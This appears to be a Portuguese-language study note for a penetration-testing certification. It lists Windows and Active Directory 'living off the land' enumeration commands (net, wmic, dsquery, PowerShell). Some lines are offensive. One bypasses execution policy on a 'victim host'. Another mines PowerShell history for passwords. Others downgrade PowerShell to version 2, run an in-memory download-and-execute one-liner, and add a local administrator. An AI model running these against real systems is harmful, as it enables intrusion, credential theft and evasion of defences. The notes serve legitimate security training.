> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/living-off-the-land.md).

# Living Off the Land

**Comandos básicos de enumeração**

| **Comando**                                             | **Resultado**                                                                                              |
| ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `hostname`                                              | Imprime o nome do PC                                                                                       |
| `[System.Environment]::OSVersion.Version`               | Imprime a versão do sistema operacional e o nível de revisão                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Imprime os patches e hotfixes aplicados ao host                                                            |
| `ipconfig /all`                                         | Imprime o estado e as configurações do adaptador de rede                                                   |
| `set`                                                   | Exibe uma lista de variáveis ​​de ambiente para a sessão atual (executada a partir do prompt CMD)          |
| `echo %USERDOMAIN%`                                     | Exibe o nome de domínio ao qual o host pertence (executado a partir do prompt CMD)                         |
| `echo %logonserver%`                                    | Imprime o nome do controlador de domínio com o qual o host faz check-in (executado a partir do prompt CMD) |

**Informações do sistema**

```powershell
systeminfo
```

Aproveitando o PowerShell

* Lista os módulos disponíveis carregados para uso

```powershell
Get-Module	
```

* Imprimirá as configurações da [política de execução](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) para cada escopo em um host.

```powershell
Get-ExecutionPolicy -List
```

* Isso mudará a política para nosso processo atual usando o `-Scope`parâmetro. Fazer isso reverterá a política assim que desocuparmos o processo ou o encerrarmos. Isso é ideal porque não faremos uma alteração permanente no host da vítima.

```powershell
Set-ExecutionPolicy Bypass -Scope Process	
```

* Com essa string, podemos obter o histórico do PowerShell do usuário especificado. Isso pode ser bem útil, pois o histórico de comandos pode conter senhas ou nos apontar para arquivos de configuração ou scripts que contêm senhas.

```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	
```

* Retorna valores de ambiente, como caminhos de chave, usuários, informações do computador, etc.

```powershell
Get-ChildItem Env: | ft Key,Value	
```

* Esta é uma maneira rápida e fácil de baixar um arquivo da web usando o PowerShell e chamá-lo de memória.

```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	
```

**Verificações rápidas usando o PowerShell**

```powershell
Get-Module
```

```powershell
Get-ExecutionPolicy -List
```

```powershell
whoami
```

```powershell
Get-ChildItem Env: | ft key,value
```

**Downgrade Powershell**

```powershell
Get-host
```

```powershell
powershell.exe -version 2
```

```powershell
get-module
```

**Verificações de firewall**

```powershell
netsh advfirewall show allprofiles
```

* **Verificação do Windows Defender (de CMD.exe)**

```powershell
sc query windefend
```

* **Obter-MpComputerStatus**

```powershell
Get-MpComputerStatus
```

***

**Am I Alone?**

* Using qwinsta

```powershell
qwinsta
```

**Informações de rede**

| **Comandos de rede**           | **Descrição**                                                                                                               |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
| `arp -a`                       | Lista todos os hosts conhecidos armazenados na tabela arp.                                                                  |
| `ipconfig /all`                | Imprime as configurações do adaptador para o host. Podemos descobrir o segmento de rede daqui.                              |
| `route print`                  | Exibe a tabela de roteamento (IPv4 e IPv6) identificando redes conhecidas e rotas da camada três compartilhadas com o host. |
| `netsh advfirewall show state` | Exibe o status do firewall do host. Podemos determinar se ele está ativo e filtrando tráfego.                               |

**Verificações rápidas do WMI**

| **Comando**                                                                          | **Descrição**                                                                                                         |
| ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Imprime o nível do patch e a descrição dos Hotfixes aplicados                                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Exibe informações básicas do host para incluir quaisquer atributos na lista                                           |
| `wmic process list /format:list`                                                     | Uma lista de todos os processos no host                                                                               |
| `wmic ntdomain list /format:list`                                                    | Exibe informações sobre o domínio e os controladores de domínio                                                       |
| `wmic useraccount list /format:list`                                                 | Exibe informações sobre todas as contas locais e quaisquer contas de domínio que tenham efetuado login no dispositivo |
| `wmic group list /format:list`                                                       | Informações sobre todos os grupos locais                                                                              |
| `wmic sysaccount list /format:list`                                                  | Despeja informações sobre quaisquer contas do sistema que estejam sendo usadas como contas de serviço.                |

**Tabela de comandos de rede úteis**

| **Comando**                                     | **Descrição**                                                                                                                   |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Informações sobre requisitos de senha                                                                                           |
| `net accounts /domain`                          | Política de senha e bloqueio                                                                                                    |
| `net group /domain`                             | Informações sobre grupos de domínio                                                                                             |
| `net group "Domain Admins" /domain`             | Listar usuários com privilégios de administrador de domínio                                                                     |
| `net group "domain computers" /domain`          | Lista de PCs conectados ao domínio                                                                                              |
| `net group "Domain Controllers" /domain`        | Listar contas de PC de controladores de domínio                                                                                 |
| `net group <domain_group_name> /domain`         | Usuário que pertence ao grupo                                                                                                   |
| `net groups /domain`                            | Lista de grupos de domínio                                                                                                      |
| `net localgroup`                                | Todos os grupos disponíveis                                                                                                     |
| `net localgroup administrators /domain`         | Listar usuários que pertencem ao grupo de administradores dentro do domínio (o grupo `Domain Admins`é incluído aqui por padrão) |
| `net localgroup Administrators`                 | Informações sobre um grupo (administradores)                                                                                    |
| `net localgroup administrators [username] /add` | Adicionar usuário aos administradores                                                                                           |
| `net share`                                     | Verifique as ações atuais                                                                                                       |
| `net user <ACCOUNT_NAME> /domain`               | Obter informações sobre um usuário dentro do domínio                                                                            |
| `net user /domain`                              | Listar todos os usuários do domínio                                                                                             |
| `net user %username%`                           | Informações sobre o usuário atual                                                                                               |
| `net use x: \computer\share`                    | Monte o compartilhamento localmente                                                                                             |
| `net view`                                      | Obter uma lista de computadores                                                                                                 |
| `net view /all /domain[:domainname]`            | Ações nos domínios                                                                                                              |
| `net view \computer /ALL`                       | Listar compartilhamentos de um computador                                                                                       |
| `net view /domain`                              | Lista de PCs do domínio                                                                                                         |

***

**Dsquery**

* **Pesquisa de usuário**

```powershell
dsquery user
```

* **Pesquisa de computador**

```powershell
dsquery computer
```

* **Pesquisa curinga**

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

* **Usuários com atributos específicos definidos (PASSWD\_NOTREQD)**

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

* **Procurando por controladores de domínio**

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
